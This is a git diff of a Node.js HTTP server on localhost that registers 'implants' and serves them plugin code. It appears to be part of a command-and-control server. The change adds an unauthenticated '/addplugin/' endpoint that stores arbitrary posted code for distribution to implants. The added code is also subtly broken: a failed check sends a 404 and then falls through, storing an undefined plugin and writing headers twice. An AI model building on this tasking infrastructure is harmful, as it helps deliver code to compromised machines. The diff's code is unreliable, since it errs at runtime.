@@ -1,6 +1,5 @@
 const http = require('node:http');
 const qs = require('node:querystring');
-const fs = require('node:fs');
 
 const host = 'localhost';
 const port = '8000'
@@ -8,8 +7,7 @@ const port = '8000'
 const PL = "PluginsToLoad";
 const IN = "implant_name";
 const PN = "plugin_name";
-
-const PLUGINDIR = "./plugins/";
+const PC = "plugin_content";
 
 const implants = {}
 const known_plugins = {}
@@ -49,14 +47,16 @@ const requestListener = function (req, res) {
                         res.writeHead(404);
                         res.end("Plugin or implant not found. Please correct.")
                     } else {
-                        fs.readFile(PLUGINDIR+implants[post[IN]][PL]+'.js', function(err,data) {
-                            res.writeHead(200);
-                            res.end(data);
-                        });
+                        res.writeHead(200);
+                        res.end(known_plugins[post[PN]]);
                     }
                     break
                 case "/addplugin/":
-                    //TODO Upload plugin and 
+                    if (!(PN in post) || !(PC in post)) {
+                        res.writeHead(404);
+                        res.end("Plugin or implant not found. Please correct.")
+                    }
+                    known_plugins[post[PN]] = post[PC];
                     res.writeHead(200);
                     res.end("OK");
                     break
